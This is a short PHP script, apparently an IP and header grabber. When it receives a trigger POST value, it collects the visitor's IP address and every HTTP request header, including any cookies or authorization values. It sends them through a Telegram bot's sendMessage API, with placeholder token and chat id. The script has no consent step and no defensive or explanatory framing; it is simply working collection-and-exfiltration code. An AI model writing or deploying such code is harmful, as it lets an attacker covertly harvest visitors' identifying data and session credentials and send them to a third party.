<?php


$a1=$_POST['a1'];

 if ($a1 == "a"){

 $theString = "";

 echo get_client_ip()."\n";
$theString = $theString . get_client_ip()."\n\n";

 foreach (getallheaders() as $name => $value) {
    echo "$name: $value\n";
    $theString = $theString . "$name: $value\n\n";
}

$theString = urlencode($theString);
$theURL = "https://api.telegram.org/botXXXXXXX/sendMessage?chat_id=YYYYYYY&text=".$theString;
$a = file_get_contents($theURL);
}

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}